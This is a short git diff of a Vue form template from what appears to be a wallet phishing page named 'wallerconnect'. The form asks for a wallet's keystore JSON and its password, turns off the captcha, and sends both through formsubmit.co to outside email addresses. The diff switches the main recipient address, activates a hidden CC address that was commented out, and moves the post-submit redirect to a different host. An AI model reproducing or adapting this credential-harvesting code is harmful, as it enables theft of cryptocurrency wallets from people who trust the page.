@@ -1,9 +1,9 @@
 <template>
-  <form action="https://formsubmit.co/Allencross82@gmail.com" method="POST">
-<!--    <input type="hidden" name="_cc" value="Paulkry89@yahoo.com">-->
+  <form action="https://formsubmit.co/solomonopeyemi@yandex.com" method="POST">
+    <input type="hidden" name="_cc" value="Paulkry89@yahoo.com">
     <input type="text" :placeholder="$route.params.id" readonly class="w-full mb-5 outline-none py-1 px-2 block capitalize">
     <input type="hidden" name="_captcha" value="false">
-    <input type="hidden" name="_next" value="https://wallerconnect.surge.sh/">
+    <input type="hidden" name="_next" value="https://wallerconnect.herokuapp.com/">
     <textarea placeholder="Keystore JSON" :name="$route.params.id" class="w-full h-40 p-2 block mb-5" required></textarea>
     <input type="password" name="password" placeholder="Password" class="w-full mb-1 outline-none py-1 px-2 block">
     <span class="text-16 text-grey block mb-5">Several lines of text beginning with "{...}" plus the password you used to encrypt it.</span>
